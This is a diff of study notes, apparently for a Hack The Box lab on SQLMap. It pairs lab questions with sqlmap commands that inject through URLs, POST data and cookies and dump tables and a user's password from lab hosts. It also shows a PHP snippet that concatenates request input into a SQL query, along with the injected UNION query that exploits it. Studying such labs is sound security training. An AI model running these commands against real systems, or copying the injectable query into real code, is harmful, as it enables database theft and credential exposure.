@@ -190,3 +190,40 @@ https://academy.hackthebox.com/module/33/section/794
   git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 --------------------
 sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
+-------------------
+sqlmap -u 'http://STMIP:STMPO/case2.php' --data 'id=1' --batch --dump
+What's the contents of table flag3? (Case #3)"
+sqlmap -u 'http://STMIP:STMPO/case3.php' -H 'Cookie: id=*' --batch --dump
+"What's the contents of table flag4? (Case #4)"
+sqlmap -r req.txt --batch --dump
+---------------------
+sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
+sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
+-------------------
+Prefix/Suffix
+sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
+$result = mysqli_query($link, $query);
+SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
+-----------------
+Level/Risk
+sqlmap -u www.example.com/?id=1 -v 3 --level=5
+sqlmap -u www.example.com/?id=1 -v 3
+sqlmap -u www.example.com/?id=1
+sqlmap -u www.example.com/?id=1 --level=5 --risk=3
+-----------------
+\"What's the contents of table flag5? (Case #5)"
+Thus, the sqlmap command will be as follows (-T flag5 specifies the table to be dumped, instead of all the tables):
+sqlmap -u 'http://83.136.253.5:57458/case5.php?id=1' --level 5 --risk 3 -T flag5 --batch --dump
+"What's the contents of table flag6? (Case #6)"
+sqlmap -u 'http://83.136.253.5:57458/case6.php?col=id' --prefix='`)' --batch --dump
+"What's the contents of table flag7? (Case #7)"
+sqlmap -u 'http://83.136.253.5:57458/case7.php?id=1' --technique=U --union-cols=5 --batch --dump
+------------------
+"What's the contents of table flag1 in the testdb database? (Case #1)"
+sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' -D 'testdb' -T flag1 --batch --dump
+---------------
+ What's the name of the column containing "style" in it's name? (Case #1)
+ sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' --search -C style --batch
+ "What's the Kimberly user's password? (Case #1)"
+ sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' --batch --dump
